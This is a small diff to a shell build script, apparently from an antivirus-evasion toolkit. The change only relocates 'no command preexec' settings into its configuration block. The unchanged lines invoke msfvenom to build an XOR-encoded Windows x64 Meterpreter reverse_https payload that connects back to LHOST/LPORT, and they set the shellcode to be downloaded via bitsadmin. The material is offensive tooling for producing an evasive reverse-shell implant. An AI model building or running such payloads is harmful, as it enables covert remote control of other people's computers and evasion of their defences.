@@ -25,6 +25,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print to_file C:/users/public/avetdbg.txt
 #CONFIGURATION_END
@@ -32,10 +35,6 @@ enable_debug_print to_file C:/users/public/avetdbg.txt
 
 # make meterpreter reverse payload
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source download_bitsadmin
